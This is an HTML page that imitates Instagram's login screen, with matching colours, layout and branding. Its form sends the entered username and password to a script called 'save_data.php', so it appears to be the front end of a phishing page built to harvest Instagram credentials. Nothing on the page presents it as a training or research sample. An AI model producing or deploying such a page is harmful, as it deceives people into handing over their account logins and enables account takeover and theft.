<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 300px;
            text-align: center;
            border-radius: 10px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        a {
            color: #3897f0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <form action="save_data.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div>
            <a href="#">Forgot password?</a>
        </div>
    </div>
</body>
</html>